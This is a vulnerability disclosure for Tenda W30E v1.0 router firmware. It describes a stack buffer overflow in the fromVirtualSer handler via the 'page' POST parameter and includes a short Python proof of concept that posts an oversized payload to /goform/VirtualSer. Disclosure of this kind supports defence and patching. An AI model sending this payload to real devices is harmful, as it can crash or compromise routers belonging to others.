## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2218.html

## Affected version

W30Ev1.0 V1.0.1.25(633)

## Vulnerability details

The Tenda W30Ev1.0 V1.0.1.25(633) firmware has a stack overflow vulnerability located in the `fromVirtualSer` function. This function accepts the `page` parameter from a POST request. The statement `sprintf(s, "nat_virtualser.asp?page=%s", v5);` leads to a buffer overflow. The user-supplied `page` can exceed the capacity of the `s` array, thus triggering this security vulnerability.

![image-20240409103214893](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409103214893.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/VirtualSer"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409103225251](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409103225251.png)